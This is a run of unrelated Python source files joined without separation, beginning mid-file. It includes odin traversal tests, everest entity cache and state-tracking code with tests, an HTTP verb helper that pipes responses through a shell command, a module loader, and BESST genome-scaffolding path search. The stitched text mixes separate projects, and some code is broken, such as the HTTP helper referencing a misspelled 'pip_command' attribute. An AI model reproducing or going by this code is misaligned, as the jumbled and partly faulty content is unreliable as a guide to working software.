                'on_exit: level2s[c].level3s[0]',                    
                'on_exit: level2s[c]',
            'on_exit: ',
        ], resource_iter.events)

        self.assertListEqual([
            'odin.traversal.Level1 resource a 0',
            'odin.traversal.Level2 resource b 1',
            'odin.traversal.Level2 resource c 1',
            'odin.traversal.Level2 resource d 1',
            'odin.traversal.Level3 resource e 2',
            'odin.traversal.Level3 resource f 2',
            'odin.traversal.Level2 resource g 1',
            'odin.traversal.Level3 resource h 2',
        ], resources)

    def test_list_structure(self):
        TEST_STRUCTURE.full_clean()

        resource_iter = TestResourceTraversalIterator(TEST_LIST_STRUCTURE)
        resources = ["%s %s %s" % (r, r.name, resource_iter.depth) for r in resource_iter]

        self.assertListEqual([
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s[0]',                    
                    'on_exit: level2s[b].level3s[0]',                    
                    'on_enter: level2s[b].level3s[1]',                    
                    'on_exit: level2s[b].level3s[1]',                    
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s[0]',                    
                'on_exit: level2s[c].level3s[0]',                    
                'on_exit: level2s[c]',
            'on_exit: ',
            'on_enter: ',
                'on_enter: level2',
                'on_exit: level2',
                'on_enter: level2s[a]',
                'on_exit: level2s[a]',
                'on_enter: level2s[b]',
                    'on_enter: level2s[b].level3s[0]',                    
                    'on_exit: level2s[b].level3s[0]',                    
                    'on_enter: level2s[b].level3s[1]',                    
                    'on_exit: level2s[b].level3s[1]',                    
                'on_exit: level2s[b]',
                'on_enter: level2s[c]',
                'on_enter: level2s[c].level3s[0]',                    
                'on_exit: level2s[c].level3s[0]',                    
                'on_exit: level2s[c]',
            'on_exit: ',
        ], resource_iter.events)

        self.assertListEqual([
            'odin.traversal.Level1 resource a 0',
            'odin.traversal.Level2 resource b 1',
            'odin.traversal.Level2 resource c 1',
            'odin.traversal.Level2 resource d 1',
            'odin.traversal.Level3 resource e 2',
            'odin.traversal.Level3 resource f 2',
            'odin.traversal.Level2 resource g 1',
            'odin.traversal.Level3 resource h 2',
            'odin.traversal.Level1 resource i 0',
            'odin.traversal.Level2 resource j 1',
            'odin.traversal.Level2 resource k 1',
            'odin.traversal.Level2 resource l 1',
            'odin.traversal.Level3 resource m 2',
            'odin.traversal.Level3 resource n 2',
            'odin.traversal.Level2 resource o 1',
            'odin.traversal.Level3 resource p 2',
        ], resources)


class TraversalPathTestCase(unittest.TestCase):
    def test_parse(self):
        actual = traversal.TraversalPath.parse('level2')
        self.assertEqual(traversal.TraversalPath((traversal.NotSupplied, traversal.NotSupplied, 'level2'),), actual)

        actual = traversal.TraversalPath.parse('level2.name')
        self.assertEqual(traversal.TraversalPath(
            (traversal.NotSupplied, traversal.NotSupplied, 'level2'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

        actual = traversal.TraversalPath.parse('level2s[b].level3s[1].name')
        self.assertEqual(traversal.TraversalPath(
            ('b', traversal.NotSupplied, 'level2s'),
            ('1', traversal.NotSupplied, 'level3s'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

        actual = traversal.TraversalPath.parse('level2s[b].level3s{code=abc}.name')
        self.assertEqual(traversal.TraversalPath(
            ('b', traversal.NotSupplied, 'level2s'),
            ('abc', 'code', 'level3s'),
            (traversal.NotSupplied, traversal.NotSupplied, 'name')
        ), actual)

    def test_add(self):
        actual = traversal.TraversalPath.parse('level2') + 'name'
        self.assertEqual(traversal.TraversalPath.parse('level2.name'), actual)

        actual = traversal.TraversalPath.parse('level2s[b]') + traversal.TraversalPath.parse('level3s[1].name')
        self.assertEqual(traversal.TraversalPath.parse('level2s[b].level3s[1].name'), actual)

    def test_valid_path(self):
        self.assertEqual('a', traversal.TraversalPath.parse('name').get_value(TEST_STRUCTURE))
        self.assertEqual('b', traversal.TraversalPath.parse('level2.name').get_value(TEST_STRUCTURE))

        r = traversal.TraversalPath.parse('level2s[b].level3s[1]').get_value(TEST_STRUCTURE)
        self.assertIsInstance(r, Level3)
        self.assertEqual('f', r.name)

    def test_invalid_path(self):
        path = traversal.TraversalPath.parse('level2s[b].level3s[4]')
        self.assertRaises(IndexError, path.get_value, TEST_STRUCTURE)

        path = traversal.TraversalPath.parse('level2s[b].level3s_sd[1]')
        self.assertRaises(KeyError, path.get_value, TEST_STRUCTURE)

"""
Entity cache and cache map.

This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Feb 26, 2013.
"""
from collections import defaultdict
from everest.repositories.memory.querying import MemoryQuery
from everest.repositories.state import EntityStateManager
from itertools import islice
from weakref import WeakValueDictionary

__docformat__ = 'reStructuredText en'
__all__ = ['EntityCache',
           'EntityCacheMap',
           ]


class EntityCache(object):
    """
    Cache for entities.

    Supports add and remove operations as well as lookup by ID and
    by slug.
    """
    def __init__(self, entities=None, allow_none_id=True):
        """
        :param bool allow_none_id: Flag specifying if calling :meth:`add`
            with an entity that does not have an ID is allowed.
        """
        #
        self.__allow_none_id = allow_none_id
        # List of cached entities. This is the only place we are holding a
        # real reference to the entity.
        if entities is None:
            entities = []
        self.__entities = entities
        # Dictionary mapping entity IDs to entities for fast lookup by ID.
        self.__id_map = WeakValueDictionary()
        # Dictionary mapping entity slugs to entities for fast lookup by slug.
        self.__slug_map = WeakValueDictionary()

    def get_by_id(self, entity_id):
        """
        Performs a lookup of an entity by its ID.

        :param int entity_id: entity ID.
        :return: entity found or ``None``.
        """
        return self.__id_map.get(entity_id)

    def has_id(self, entity_id):
        """
        Checks if this entity cache holds an entity with the given ID.

        :return: Boolean result of the check.
        """
        return entity_id in self.__id_map

    def get_by_slug(self, entity_slug):
        """
        Performs a lookup of an entity by its slug.

        :param str entity_id: entity slug.
        :return: entity found or ``None``.
        """
        return self.__slug_map.get(entity_slug)

    def has_slug(self, entity_slug):
        return entity_slug in self.__slug_map

    def add(self, entity):
        """
        Adds the given entity to this cache.

        :param entity: Entity to add.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises ValueError: If the ID of the entity to add is ``None``.
        """
        # For certain use cases (e.g., staging), we do not want the entity to
        # be added to have an ID yet.
        if not entity.id is None:
            if entity.id in self.__id_map:
                raise ValueError('Duplicate entity ID "%s".' % entity.id)                    
            self.__id_map[entity.id] = entity                    
        elif not self.__allow_none_id:
            raise ValueError('Entity ID must not be None.')
        # The slug can be a lazy attribute depending on the
        # value of other (possibly not yet initialized) attributes which is
        # why we can not always assume it is available at this point.
        if hasattr(entity, 'slug') and not entity.slug is None:
            if entity.slug in self.__slug_map:
                raise ValueError('Duplicate entity slug "%s".' % entity.slug)                    
            self.__slug_map[entity.slug] = entity                    
        self.__entities.append(entity)                    

    def remove(self, entity):
        """
        Removes the given entity from this cache.

        :param entity: Entity to remove.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises KeyError: If the given entity is not in this cache.
        :raises ValueError: If the ID of the given entity is `None`.
        """
        self.__id_map.pop(entity.id, None)
        self.__slug_map.pop(entity.slug, None)
        self.__entities.remove(entity)

    def replace(self, entity):
        """
        Replaces the current entity that has the same ID as the given new
        entity with the latter.

        :param entity: Entity to replace.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises KeyError: If the given entity is not in this cache.
        :raises ValueError: If the ID of the given entity is `None`.
        """
        if entity.id is None:
            raise ValueError('Entity ID must not be None.')
        old_entity = self.__id_map[entity.id]
        self.remove(old_entity)
        self.add(entity)

    def get_all(self):
        """
        Returns the list of all entities in this cache in the order they
        were added.
        """
        return self.__entities

    def retrieve(self, filter_expression=None,
                 order_expression=None, slice_expression=None):
        """
        Retrieve entities from this cache, possibly after filtering, ordering
        and slicing.
        """
        ents = iter(self.__entities)
        if not filter_expression is None:
            ents = filter_expression(ents)
        if not order_expression is None:
            # Ordering always involves a copy and conversion to a list, so
            # we have to wrap in an iterator.
            ents = iter(order_expression(ents))
        if not slice_expression is None:
            ents = islice(ents, slice_expression.start, slice_expression.stop)
        return ents

    def __contains__(self, entity):
        if not entity.id is None:
            is_contained = entity.id in self.__id_map
        else:
            is_contained = entity in self.__entities
        return is_contained


class EntityCacheMap(object):
    """
    Map for entity caches.
    """
    def __init__(self):
        self.__cache_map = defaultdict(EntityCache)

    def __getitem__(self, entity_class):
        return self.__cache_map[entity_class]

    def get_by_id(self, entity_class, entity_id):
        cache = self.__cache_map[entity_class]
        return cache.get_by_id(entity_id)

    def get_by_slug(self, entity_class, slug):
        cache = self.__cache_map[entity_class]
        return cache.get_by_slug(slug)

    def add(self, entity_class, entity):
        cache = self.__cache_map[entity_class]
        cache.add(entity)

    def remove(self, entity_class, entity):
        cache = self.__cache_map[entity_class]
        cache.remove(entity)

    def update(self, entity_class, source_data, target_entity):
        EntityStateManager.set_state_data(entity_class,
                                          source_data, target_entity)

    def query(self, entity_class):
        return MemoryQuery(entity_class,
                           self.__cache_map[entity_class].get_all())

    def __contains__(self, entity):
        cache = self.__cache_map[type(entity)]
        return entity in cache

    def keys(self):
        return self.__cache_map.keys()

"""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Mar 14, 2013.
"""
from everest.entities.attributes import get_domain_class_attribute_iterator
from everest.entities.attributes import get_domain_class_attribute_names
from everest.utils import get_nested_attribute
from everest.utils import set_nested_attribute
from pyramid.compat import iteritems_
from weakref import ref

__docformat__ = 'reStructuredText en'
__all__ = ['ENTITY_STATES',
           'EntityStateManager',
           ]


class ENTITY_STATES(object):
    """
    Entity state flags.
    """
    CLEAN = 'CLEAN'
    NEW = 'NEW'
    DELETED = 'DELETED'
    DIRTY = 'DIRTY'


class EntityStateManager(object):
    """
    Manager for entity state and state data.

    Initially, an object is marked as NEW (freshly instantiated) or CLEAN
    (freshly fetched from repository).

    Only a weak reference to the tracked object is stored to avoid circular
    references.

    Not all state transitions are allowed.
    """
    # FIXME: Need a proper state diagram here or drop tracking alltogether.
    __allowed_transitions = set([(None, ENTITY_STATES.NEW),
                                 (None, ENTITY_STATES.CLEAN),
                                 (None, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.NEW, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.NEW, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.DELETED, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.DELETED, ENTITY_STATES.NEW),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.DIRTY),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.NEW),
                                 (ENTITY_STATES.DIRTY, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.DIRTY, ENTITY_STATES.DELETED),
                                 ])

    def __init__(self, entity_class, entity, unit_of_work):
        self.__entity_class = entity_class
        self.__obj_ref = ref(entity)
        self.__uow_ref = ref(unit_of_work)
        self.__state = None
        self.__last_state = self.get_state_data(entity_class, entity)

    @classmethod
    def manage(cls, entity_class, entity, unit_of_work):
        """
        Manages the given entity under the given Unit Of Work.

        If `entity` is already managed by the given Unit Of Work, nothing
        is done.

        :raises ValueError: If the given entity is already under management
          by a different Unit Of Work.
        """
        if hasattr(entity, '__everest__'):
            if not unit_of_work is entity.__everest__.unit_of_work:
                raise ValueError('Trying to register an entity that has been '
                                 'registered with another session!')
        else:
            entity.__everest__ = cls(entity_class, entity, unit_of_work)

    @classmethod
    def release(cls, entity, unit_of_work):
        """
        Releases the given entity from management under the given Unit Of
        Work.

        :raises ValueError: If `entity` is not managed at all or is not
          managed by the given Unit Of Work.
        """
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to unregister an entity that has not '
                             'been registered yet!')
        elif not unit_of_work is entity.__everest__.unit_of_work:
            raise ValueError('Trying to unregister an entity that has been '
                             'registered with another session!')
        delattr(entity, '__everest__')

    @classmethod
    def set_state(cls, entity, state):
        """
        Sets the state flag of the given entity to the given value.

        :raises ValueError: If `entity` is not managed.
        """
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to mark an unregistered entity as '
                             '%s!' % state)
        entity.__everest__.state = state

    @classmethod
    def get_state(cls, entity):
        """
        Returns the state flag of the given entity.

        :raises ValueError: If `entity` is not managed.
        """
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to get the state of an unregistered '
                             'entity!')
        return entity.__everest__.state

    @classmethod
    def transfer_state_data(cls, entity_class, source_entity, target_entity):
        """
        Transfers instance state data from the given source entity to the
        given target entity.
        """
        state = cls.get_state_data(entity_class, source_entity)
        cls.set_state_data(entity_class, state, target_entity)

    @classmethod
    def get_state_data(cls, entity_class, entity):
        """
        Returns state data for the given entity of the given class.

        :param entity: Entity to obtain the state data from.
        :returns: Dictionary mapping attributes to attribute values.
        """
        attrs = get_domain_class_attribute_iterator(entity_class)
        return dict([(attr,
                      get_nested_attribute(entity, attr.entity_attr))
                     for attr in attrs])                    

    @classmethod
    def set_state_data(cls, entity_class, data, entity):
        """
        Sets the given state data on the given entity of the given class.

        :param data: State data to set.
        :type data: Dictionary mapping attributes to attribute values.
        :param entity: Entity to receive the state data.
        """
        attr_names = get_domain_class_attribute_names(entity_class)
        nested_items = []
        for attr, new_attr_value in iteritems_(data):
            if not attr.entity_attr in attr_names:
                raise ValueError('Can not set attribute "%s" for entity '
                                 '"%s".' % (attr.entity_attr, entity_class))
            if '.' in attr.entity_attr:
                nested_items.append((attr, new_attr_value))
                continue
            else:
                setattr(entity, attr.entity_attr, new_attr_value)
        for attr, new_attr_value in nested_items:
            try:
                set_nested_attribute(entity, attr.entity_attr, new_attr_value)
            except AttributeError, exc:
                if not new_attr_value is None:
                    raise exc

    def __get_state(self):
        state = self.__state
        if state == ENTITY_STATES.CLEAN:
            if self.get_state_data(self.__entity_class, self.__obj_ref()) \
               != self.__last_state:
                state = ENTITY_STATES.DIRTY
        return state

    def __set_state(self, state):
        if not (self.__get_state(), state) in self.__allowed_transitions:
            raise ValueError('Invalid state transition %s -> %s.'
                             % (self.__state, state))
        self.__state = state
        if state == ENTITY_STATES.CLEAN:
            self.__last_state = self.get_state_data(self.__entity_class,
                                                    self.__obj_ref())

    #: The current state. One of the `ENTITY_STATES` constants.
    state = property(__get_state, __set_state)

    @property
    def unit_of_work(self):
        return self.__uow_ref()


"""
This file is part of the everest project.                     
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Apr 13, 2013.
"""
from everest.entities.base import Entity
from everest.querying.interfaces import IFilterSpecificationFactory
from everest.querying.interfaces import IOrderSpecificationFactory
from everest.querying.specifications import FilterSpecificationFactory
from everest.querying.specifications import OrderSpecificationFactory
from everest.querying.specifications import asc
from everest.querying.specifications import eq
from everest.repositories.memory.cache import EntityCache
from everest.repositories.memory.querying import EvalFilterExpression
from everest.repositories.memory.querying import EvalOrderExpression
from everest.testing import Pep8CompliantTestCase
from pyramid.threadlocal import get_current_registry
from everest.repositories.memory.cache import EntityCacheMap

__docformat__ = 'reStructuredText en'
__all__ = ['EntityCacheTestCase',
           'EntityCacheMapTestCase',
           ]


class EntityCacheTestCase(Pep8CompliantTestCase):
    def set_up(self):
        Pep8CompliantTestCase.set_up(self)
        # Some tests require the filter and order specification factories.
        flt_spec_fac = FilterSpecificationFactory()
        ord_spec_fac = OrderSpecificationFactory()
        reg = get_current_registry()
        reg.registerUtility(flt_spec_fac, IFilterSpecificationFactory)
        reg.registerUtility(ord_spec_fac, IOrderSpecificationFactory)

    def test_basics(self):
        ent = MyEntity(id=0)
        cache = EntityCache(entities=[])
        cache.add(ent)
        self.assert_true(cache.get_by_id(ent.id) is ent)
        self.assert_true(cache.has_id(ent.id))
        self.assert_true(cache.get_by_slug(ent.slug) is ent)
        self.assert_true(cache.has_slug(ent.slug))
        ent1 = MyEntity(id=0)
        txt = 'FROBNIC'
        ent1.text = txt
        cache.replace(ent1)
        self.assert_equal(cache.get_by_id(ent.id).text, txt)
        self.assert_equal(cache.get_all(), [ent])
        self.assert_equal(list(cache.retrieve()), [ent])
        cache.remove(ent)
        self.assert_is_none(cache.get_by_id(ent.id))
        self.assert_is_none(cache.get_by_slug(ent.slug))

    def test_filter_order_slice(self):
        ent0 = MyEntity(id=0)
        ent1 = MyEntity(id=1)
        ent2 = MyEntity(id=2)
        cache = EntityCache(entities=[])
        cache.add(ent0)
        cache.add(ent1)
        cache.add(ent2)
        filter_expr = EvalFilterExpression(~eq(id=0))
        order_expr = EvalOrderExpression(asc('id'))
        slice_expr = slice(1, 2)
        self.assert_equal(list(cache.retrieve(filter_expression=filter_expr,
                                              order_expression=order_expr,
                                              slice_expression=slice_expr)),
                          [ent2])

    def test_allow_none_id_false(self):
        ent = MyEntity()
        cache = EntityCache(entities=[], allow_none_id=False)
        self.assert_raises(ValueError, cache.add, ent)


class EntityCacheMapTestCase(Pep8CompliantTestCase):
    def test_basics(self):
        ecm = EntityCacheMap()
        ent = MyEntity(id=0)
        ecm.add(MyEntity, ent)
        self.assert_equal(ecm[MyEntity].get_by_id(0), ent)
        self.assert_true(ent in ecm)
        self.assert_equal(ecm.keys(), [MyEntity])
        ecm.remove(MyEntity, ent)
        self.assert_false(ent in ecm)


class MyEntity(Entity):
    text = None


"""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Oct 21, 2013.
"""
from everest.testing import Pep8CompliantTestCase
from everest.traversalpath import TraversalPath

__docformat__ = 'reStructuredText en'
__all__ = ['TraversalPathTestCase',
           ]


class TraversalPathTestCase(Pep8CompliantTestCase):
    def test_basics(self):
        tp = TraversalPath()
        self.assert_equal(len(tp), 0)
        self.assert_is_none(tp.parent)
        self.assert_is_none(tp.relation_operation)
        parent = 'proxy'
        rel_op = 'relation_operation'
        tp.push(parent, 'attribute', rel_op)                    
        self.assert_equal(len(tp), 1)
        self.assert_equal(tp.parent, parent)
        self.assert_equal(tp.relation_operation, rel_op)
        tp1 = tp.clone()                    
        tp.pop()
        self.assert_equal(len(tp), 0)
        self.assert_equal(len(tp1), 1)                    


"""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Oct 16, 2013.
"""

__docformat__ = 'reStructuredText en'
__all__ = ['TraversalPath',
           'TraversalPathNode',
           ]


class TraversalPathNode(object):
    """
    Value object representing a node in a traversal path.
    """
    def __init__(self, proxy, attribute, relation_operation):                    
        """
        :param proxy: Data traversal proxy for this node.
        :param attribute: Resource attribute for this node.
        :param relation_operation: Relation operation for this node. One of
          the constants defined in
          :class:`everest.constants.RELATION_OPERATIONS`.
        """
        self.proxy = proxy
        self.attribute = attribute
        self.relation_operation = relation_operation


class TraversalPath(object):
    """
    Value object tracking a path taken by a data tree traverser.
    """
    def __init__(self, nodes=None):
        if nodes is None:
            nodes = []
        self.nodes = nodes

    def push(self, proxy, attribute, relation_operation):                    
        """
        Adds a new :class:`TraversalPathNode` constructed from the given
        arguments to this traversal path.
        """
        node = TraversalPathNode(proxy, attribute, relation_operation)                    
        self.nodes.append(node)

    def pop(self):
        """
        Removes the last traversal path node from this traversal path.
        """
        self.nodes.pop()                    

    def __len__(self):
        return len(self.nodes)

    def clone(self):                    
        """
        Returns a copy of this traversal path.                    
        """
        return TraversalPath(self.nodes[:])                    

    @property
    def parent(self):
        """
        Returns the proxy from the last node visited on the path, or `None`,
        if no node has been visited yet.
        """
        if len(self.nodes) > 0:
            parent = self.nodes[-1].proxy
        else:
            parent = None
        return parent

    @property
    def relation_operation(self):
        """
        Returns the relation operation from the last node visited on the
        path, or `None`, if no node has been visited yet.
        """
        if len(self.nodes) > 0:
            rel_op = self.nodes[-1].relation_operation
        else:
            rel_op = None
        return rel_op

import subprocess


class HttpVerb(object):
    def __init__(self, connection, args, logger, verb):
        self.connection = connection
        self.logger = logger
        self.verb = verb
        self.path = args.pop()
        self.pipe_command = args.pop() if args else None

    def __del__(self):
        self.connection.close()

    def run(self, headers={}):
        self.connection.request(self.verb, self.path, headers=headers)
        return self.connection.getresponse()

    def pipe(self, command, data):
        p = subprocess.Popen(command, shell=True, bufsize=-1,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = p.communicate(data)

        result = None

        if error:
            self.logger.print_error(error.decode("utf-8"))
        else:
            result = output.decode("utf-8")

        return result


class HttpHead(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpHead, self).__init__(connection, args, logger, "HEAD")

    def run(self, headers):
        response = super(HttpHead, self).run(headers)
        self.logger.print_response_code(response)
        self.logger.print_headers(headers.items(), sending=True)
        self.logger.print_headers(response.getheaders())


class HttpGet(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpGet, self).__init__(connection, args, logger, "GET")

    def run(self, headers):
        response = super(HttpGet, self).run(headers)
        self.logger.print_response_code(response)
        self.logger.print_headers(response.getheaders())

        data = response.read()

        if self.pipe_command:
            data = self.pipe(self.pip_command, data)                    

        if data:
            self.logger.print_data(data)


class HttpPost(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpPost, self).__init__(connection, args, logger, "POST")

    def run(self, headers):
        pass


class HttpPut(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpPut, self).__init__(connection, args, logger, "PUT")

    def run(self, args, headers):
        pass


class HttpDelete(HttpVerb):
    def __init__(self, connection, args, logger):
        super(HttpDelete, self).__init__(connection, args, logger, "DELETE")

    def run(self, args, headers):
        pass


import os
import sys
import imp
import logging


def _is_package(directory):                    
    return os.path.exists(os.path.join(directory, '__init__.py'))


def _guess_import_path_and_name(file):
    current = os.path.dirname(file)
    base = os.path.splitext(os.path.basename(file))[0]                    
    name = [base] if base != '__init__' else []                    
    parent = None                    
    while current != parent and _is_package(current):                    
        parent = os.path.dirname(current)                    
        name.append(os.path.basename(current))                    
        current = parent                    

    return current, '.'.join(reversed(name))                    


def run_file(runfile, func_to_get='main'):
    # Make sure imports within the module behave as expected
    import_path, name = _guess_import_path_and_name(runfile)
    if import_path not in sys.path:
        sys.path.insert(0, import_path)
    sys.modules['__tng_runfile__'] = module = imp.load_source(name, runfile)

    if hasattr(module, func_to_get):
        return getattr(module, func_to_get)
    else:
        logging.getLogger('tng').warn(
            'No {} function found in {}'.format(func_to_get, runfile))


'''
    Created on Jun 21, 2012
    
    @author: ksahlin
    
    This file is part of BESST.
    
    BESST is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    
    BESST is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    
    You should have received a copy of the GNU General Public License
    along with BESST.  If not, see <http://www.gnu.org/licenses/>.
    '''

import time
import networkx as nx
from collections import defaultdict
import multiprocessing as mp


def ScorePaths(G, paths, all_paths, param):
    if len(paths) == 0:
        return ()

    def calculate_connectivity(path, G):
        """
            Contig ends has even or odd numbered placements (index) in the path list. In case
            of contamination, good links are between an even to an odd indexed contig-end, or vice versa.

        """
        bad_link_weight = 0
        good_link_weight = 0
        links_not_in_path = 0
        links_wrong_orientation_in_path = 0
        even, odd = path[::2], path[1::2]
        nodes_even = set(even)
        nodes_odd = set(odd)
        visited = set()
        for i, node in enumerate(path):
            for nbr in G.neighbors(node):
                if i % 2 == 0 and node[0] != nbr[0]:
                    if nbr in nodes_odd:
                        if nbr not in visited:
                            good_link_weight += G[node][nbr]['nr_links']
                        else:
                            pass
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
                elif i % 2 == 1 and node[0] != nbr[0]:
                    if nbr not in nodes_even:
                        bad_link_weight += G[node][nbr]['nr_links']
                    elif nbr not in visited:
                        bad_link_weight += G[node][nbr]['nr_links']
            visited.add(node)
        good_link_weight = good_link_weight
        bad_link_weight = bad_link_weight
        try:
            score = good_link_weight / float(bad_link_weight)
        except ZeroDivisionError:
            score = good_link_weight

        return score, bad_link_weight


    def calculate_connectivity_contamination(path, G):
        """
            Contig ends has even or odd numbered placements (index) in the path list. In case
            of contamination, good links are between an even to an odd indexed contig-end, or vice versa.

        """
        bad_link_weight = 0
        good_link_weight = 0
        links_not_in_path = 0
        links_wrong_orientation_in_path = 0
        even, odd = path[::2], path[1::2]
        nodes_even = set(even)
        nodes_odd = set(odd)
        for i, node in enumerate(path):
            for nbr in G.neighbors(node):
                if i % 2 == 0 and node[0] != nbr[0]:
                    if nbr in nodes_odd:
                        good_link_weight += G[node][nbr]['nr_links']
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
                elif i % 2 == 1 and node[0] != nbr[0]:
                    if nbr in nodes_even:
                        good_link_weight += G[node][nbr]['nr_links']
                    else:
                        bad_link_weight += G[node][nbr]['nr_links']
        good_link_weight = good_link_weight/2
        bad_link_weight = bad_link_weight

        # ###############


        try:
            score = good_link_weight / float(bad_link_weight)
        except ZeroDivisionError:
            score = good_link_weight

        return score, bad_link_weight


    #print '\nSTARTING scoring paths:'
    for path_ in paths:
        path = path_[0]
        path_len = path_[1]
        #calculate spanning score s_ci
        if param.contamination_ratio:
            score, bad_link_weight = calculate_connectivity_contamination(path, G)
        else:
            score, bad_link_weight = calculate_connectivity(path, G)


        if param.no_score and score >= param.score_cutoff:
            all_paths.append([score, bad_link_weight, path, path_len])
            #Insert_path(all_paths, score, path , bad_link_weight, path_len)
        elif len(path) > 2 and score >= param.score_cutoff: #startnode and end node are not directly connected
            all_paths.append([score, bad_link_weight, path, path_len])
            #Insert_path(all_paths, score, path , bad_link_weight, path_len)

    return ()

def find_all_paths_for_start_node(graph, start, end, already_visited, is_withing_scaf, max_path_length_allowed, param):                    
    path = []
    paths = []
    if start[1] == 'L':
        forbidden = set()
        forbidden.add((start[0], 'R'))
    else:
        forbidden = set()
        forbidden.add((start[0], 'L'))

    #Joining within scaffolds
    if is_withing_scaf:
        element = end.pop()
        end.add(element)
        if element[1] == 'L':
            forbidden.add((element[0], 'R'))
        else:
            forbidden.add((element[0], 'L'))


    #TODO: Have length criteria that limits the path lenght due to complecity reasons. Can also identify strange
    #links by looking how many neighbors a contig has and how mych the library actually can span
    path_len = 0
    queue = [(start, path, path_len)]#, sum_path)]
    #prev_node = start
    counter = 0
    while queue:
        #prev_node = start
        counter += 1
        #if counter % 100 == 0:
        #    print 'Potential paths:', counter, 'paths found: ', len(paths)
        if counter > param.path_threshold or len(path) > 100:
            print 'Hit path_threshold of {0} iterations! consider increase --iter <int> parameter to over {0} if speed of BESST is not a problem. Standard increase is, e.g., 2-10x of current value'.format(param.path_threshold)
            break
            
        start, path, path_len = queue.pop() #start, end, path, sum_path = queue.pop()  
        try:
            prev_node = path[-1]
        except IndexError:
            prev_node = start
        path = path + [start]
        path_len = len(path)
        #print 'PATH', path ,'end', end 
        if path_len > max_path_length_allowed: #All possible paths can be exponential!! need something to stop algorithm in time
            continue
        #if score < score_best_path: # need something to stop a bad path
        #    continue
        if start in already_visited or start in forbidden:
            continue

        if start in end:
            # if (start_node, start) in nodes_present_in_path:
            #     nodes_present_in_path[(start_node, start)] = nodes_present_in_path[(start_node, start)].union(path)
            # else:
            #     nodes_present_in_path[(start_node, start)] = set(path)
            paths.append((path, path_len))
            continue


        if  prev_node[0] != start[0]:
            if start[1] == 'L' and (start[0], 'R') not in forbidden:
                queue.append(((start[0], 'R'), path, path_len)) #, sum_path + graph[start][(start[0], 'R')]['nr_links']))
            elif start[1] == 'R' and (start[0], 'L') not in forbidden:
                queue.append(((start[0], 'L'), path, path_len))#, sum_path + graph[start][(start[0], 'L')]['nr_links']))                
        else:
            for node in set(graph[start]).difference(path):
                if node not in forbidden: # and node not in already_visited: 
                    try: # if last node (i.e. "end") it is not present in small_scaffolds and it should not be included in the length
                        queue.append((node, path, path_len + graph[node[0]]['length'])) #  small_scaffolds[node[0]].s_length))   #
                    except KeyError:
                        queue.append((node, path, path_len))

    return paths



def BetweenScaffolds(G_prime, end, iter_nodes, param):
    # here we should have a for loop looping over all start nodes. Start nodes already examined should be removed in a nice way to skip over counting
    already_visited = set()
    all_paths = []
    print 'Entering "find_all_paths_for_start_node" '
    iter_count = 0
    cnter = 0
    if param.max_extensions:
        iter_threshold = param.max_extensions
    else: 
        iter_threshold = len(end)

    print 'iterating until maximum of {0} extensions.'.format(iter_threshold) 
    print 'nodes:{0}, edges: {1}'.format(len(G_prime.nodes()), len(G_prime.edges()))
    while len(iter_nodes) > 0 and iter_count <= iter_threshold:
        iter_count += 1
        start_node = iter_nodes.pop()
        if cnter % 100 == 0:
            print 'enter Betwween scaf node: ', cnter
        end.difference_update(set([start_node]))
        paths = find_all_paths_for_start_node(G_prime, start_node, end, already_visited, 0, 2 ** 32, param)                    
        already_visited.add(start_node)
        ScorePaths(G_prime, paths, all_paths, param)
        cnter += 1
    #all_paths = ExtendScaffolds(all_paths)
    #print all_paths
    print 'Total nr of paths found: {0} with score larger than: {1}'.format(len(all_paths), param.score_cutoff)
    all_paths.sort(key=lambda list_: list_[0]) 
    #print all_paths
    return(all_paths)

def WithinScaffolds(G, G_prime, start, end_node, already_visited, max_path_length, param):
    end = set()
    end.add(end_node)
    all_paths = []
    already_visited.difference_update(set([start, end_node]))
    paths = find_all_paths_for_start_node(G_prime, start, end, already_visited, 1, max_path_length, param)                    
    already_visited.add(start)
    already_visited.add(end_node)
    #print paths
    if len(paths) > 1:
        ScorePaths(G_prime, paths, all_paths,param)
        all_paths.sort(key=lambda list_: list_[0]) 

        if len(all_paths) > 0:
            return all_paths

    return []

if __name__ == '__main__':
    import Scaffold
    small_scaffolds_test = {}
    for i in range(1, 7):
        S = Scaffold.scaffold(i, 0, 0, {}, {})
